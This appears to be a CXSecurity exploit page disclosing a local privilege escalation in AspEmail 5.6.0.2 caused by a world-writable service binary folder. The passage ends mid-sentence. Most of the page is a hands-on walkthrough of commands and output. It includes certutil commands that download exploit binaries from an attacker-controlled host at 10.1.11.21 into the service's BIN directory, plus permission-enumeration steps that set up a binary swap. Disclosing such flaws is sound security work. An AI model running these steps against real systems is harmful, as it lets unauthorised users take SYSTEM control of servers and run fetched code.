---
title: AspEmail v5.6.0.2 Local Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023040079
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-26
fetch_date: 2025-10-04T11:32:35.243875
---

# AspEmail v5.6.0.2 Local Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AspEmail v5.6.0.2 Local Privilege Escalation** **2023.04.25**  Credit:  **[Zer0FauLT [admindeepsec@proton.me]](https://cxsecurity.com/author/Zer0FauLT%2B%5Badmindeepsec%40proton.me%5D/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

####################################################################################################################
# Exploit Title: AspEmail 5.6.0.2 - Local Privilege Escalation #
# Vulnerability Category: [Weak Services Permission - Binary Permission Vulnerability] #
# Date: 13/04/2023 #
# Exploit Author: Zer0FauLT [admindeepsec@proton.me] #
# Vendor Homepage: https://www.aspemail.com #
# Software Link: https://www.aspemail.com/download.html #
# Product: AspEmail #
# Version: AspEmail 5.6.0.2 and all #
# Platform - Architecture : Windows - 32-bit | 64-bit | Any CPU #
# Tested on: Windows Server 2016 and Windows Server 2019 #
# CVE : 0DAY #
####################################################################################################################
# ==================================================================================================================
[+] C:\PenTest>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ========================================= ========
SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
# ==================================================================================================================
\* First, we will test whether the AspEmail service is active.
\* First of all, we perform a query to list the processes running in the system with normal user rights and test whether the process of the relevant service is running:
[+] C:\PenTest>tasklist /svc | findstr EmailAgent.exe
EmailAgent.exe 4400 Persits Software EmailAgent
or
[+] C:\PenTest>tasklist /svc | findstr EmailAgent64.exe
EmailAgent64.exe 4400 Persits Software EmailAgent
\* We have detected that the process of the "Persits Software Email Agent" Service is state "RUNNING".
\* Now we know that AspEmail service is active.
# ==================================================================================================================
\* We will need these:
[+] C:\PenTest>certutil -urlcache -split -f http://10.1.11.21/EmailAgent.exe "C:\Program Files (x86)\Persits Software\AspEmail\BIN\EmailAgentPrivESC.exe" <<<=== MyExploit
[+] C:\PenTest>certutil -urlcache -split -f http://10.1.11.21/nircmd.exe "C:\Program Files (x86)\Persits Software\AspEmail\BIN\nircmd.exe"
[+] C:\PenTest>certutil -urlcache -split -f http://10.1.11.21/Mail.exe "C:\Windows\Temp\Mail.exe"
[+] C:\PenTest>certutil -urlcache -split -f http://10.1.11.21/Run.exe "C:\Windows\Temp\Run.bat"
[+] C:\PenTest>certutil -urlcache -split -f http://10.1.11.21/PrivescCheck.ps1 "C:\PenTest\PrivescCheck.ps1"
# ==================================================================================================================
[+] C:\PenTest>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
Name: Persits Software EmailAgent
ImagePath : "C:\Program Files (x86)\Persits Software\AspEmail\BIN\Email
Agent.exe" /run
User : LocalSystem
ModifiablePath : C:\Program Files (x86)\Persits Software\AspEmail\BIN
IdentityReference : Everyone
Permissions : WriteOwner, Delete, WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory,
AppendData/AddSubdirectory, WriteExtendedAttributes, WriteDAC, ReadAttributes, WriteData/AddFile,
ReadExtendedAttributes, DeleteChild, Execute/Traverse
Status : Unknown
UserCanStart : False
UserCanStop : False
[+] C:\PenTest>del PrivescCheck.ps1
\* We detected "Persits Software EmailAgent" Service "Binary Permission Vulnerability" in our checks.
# ================================================================================================================== #
[+] C:\PenTest>ICACLS "C:\Program Files (x86)\Persits Software\AspEmail"
Successfully processed 0 files; Failed processing 1 files
C:\Program Files (x86)\Persits Software\AspEmail: Access is denied.
\* We do not have permission to access subdirectories.
# ==================================================================================================================
[+] C:\PenTest>ICACLS "C:\Program Files (x86)\Persits Software\AspEmail\BIN"
C:\Program Files (x86)\Persits Software\AspEmail\BIN Everyone:(OI)(CI)(F)
DeepSecLab\psacln:(I)(OI)(CI)(N)
DeepSecLab\psaadm:(I)(OI)(CI)(N)
DeepSecLab\psaadm\_users:(I)(OI)(CI)(N)
BUILTIN\Administrators:(I)(F)
CREATOR OWNER:(I)(OI)(CI)(IO)(F)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX)
NT SERVICE\TrustedInstaller:(I)(CI)(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX)
\* Unlike other directories, we have full privileges in the "BIN" directory of the service.
\* This is chmod 0777 - rwxrwxrwx in linux language.
# ==================================================================================================================
[+] C:\PenTest>WMIC Path Win32\_LogicalFileSecuritySetting WHERE Path="C:\\Program Files (x86)\\Persits Software\\AspEmail\\Bin\\EmailAgent.exe" ASSOC /RESULTROLE:Owner /ASSOCCLASS:Win32\_LogicalFileOwner /RESULTCLASS:Win32\_SID
\_\_PATH
\\DeepSecLab\root\cimv2:Win32\_LogicalFileSecuritySetting.Path="C:\\Program Files (x86)\\Persits Software\\AspEmail\\Bin\\EmailAgent.exe"
\\DeepSecLab\root\cimv2:Win32\_SID.SID="S-1-5-32-544"
root\cimv2 DeepSecLab {} 5 Win32\_SID.SID="S-1-5-32-544" Win32\_SID Win32\_SID 2 Administrators {1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0} BUILTIN S-1-5-32-544 16
[EmailAgent.exe] ===>>> Owner: BUILTIN\Administrators
\* We understood "EmailAgent.ex...